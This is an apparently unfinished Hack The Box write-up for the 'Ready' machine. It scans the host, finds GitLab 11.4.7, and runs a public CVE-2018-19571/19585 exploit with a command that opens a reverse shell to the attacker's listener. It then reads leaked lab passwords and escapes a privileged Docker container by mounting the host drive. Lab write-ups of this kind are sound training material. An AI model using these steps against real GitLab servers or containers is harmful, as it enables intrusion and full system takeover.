---
layout: single
title: Ready - Hack The Box
excerpt: "TODO"
date: 2021-05-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-ready/ready_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - todo
---

![](/assets/images/htb-writeup-ready/ready_logo.png)

TODO

## Porscan

```
sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
Nmap scan report for 10.129.149.31
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.149.31:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
```

## Gitlab

The webserver on port 5080 runs the Gitlab application.

![](/assets/images/htb-writeup-ready/gitlab1.png)

We can create a new account.

![](/assets/images/htb-writeup-ready/gitlab2.png)

In the projet list we see there's a single projet called *ready-channel*.

![](/assets/images/htb-writeup-ready/gitlab3.png)

Gitlab projet members

![](/assets/images/htb-writeup-ready/gitlab4.png)

Gitlab version: 11.4.7

![](/assets/images/htb-writeup-ready/gitlab5.png)

Exploit-DB search results: CVE-2018-19571 + CVE-2018-19585
https://www.exploit-db.com/raw/49334

![](/assets/images/htb-writeup-ready/gitlab6.png)

`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`

![](/assets/images/htb-writeup-ready/shell.png)

We can get the user's flag from dude's home directory.

![](/assets/images/htb-writeup-ready/user.png)

## Privesc

linpeas.sh

```
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

This is the root password but we're in a docker container

```
drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
-rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
```

```
cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

We have privileges to mount the host drive inside the container because we're a privileged container.

We can just read the root flag after mounting the drive.

![](/assets/images/htb-writeup-ready/root.png)